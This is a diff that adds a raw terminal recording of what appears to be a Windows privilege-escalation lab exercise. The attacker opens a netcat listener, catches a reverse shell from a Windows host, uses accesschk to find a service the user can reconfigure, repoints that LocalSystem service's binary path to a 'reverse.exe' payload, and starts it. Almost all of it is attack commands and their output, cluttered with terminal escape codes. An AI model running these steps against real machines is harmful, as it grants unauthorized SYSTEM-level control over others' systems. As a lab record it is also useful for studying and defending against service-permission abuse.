@@ -1,0 +1,55 @@
+Script started on 2025-03-16 05:49:44+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 10242
+Microsoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mC:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hC:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+[KC:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+[KRW daclsvc
+	SERVICE_QUERY_STATUS
+	SERVICE_QUERY_CONFIG
+	SERVICE_CHANGE_CONFIG
+	SERVICE_INTERROGATE
+	SERVICE_ENUMERATE_DEPENDENTS
+	SERVICE_START
+	SERVICE_STOP
+	READ_CONTROL
+[K
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7msc qc daclsvc[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsc qc daclsvc
+[Ksc qc daclsvc
+[K[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: daclsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DACL Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7msc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+[Ksc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+[K[SC] ChangeServiceConfig SUCCESS
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mnet start daclsvc[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnet start daclsvc
+[Knet start daclsvc
+[KThe service is not responding to the control function.
+[K
+More help is available by typing NET HELPMSG 2186.
+
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>net start daclsvc[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnet start daclsvc
+[Knet start daclsvc
+[KThe service is not responding to the control function.
+[K
+More help is available by typing NET HELPMSG 2186.
+
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-03-16 06:03:49+03:00 [COMMAND_EXIT_CODE="0"]
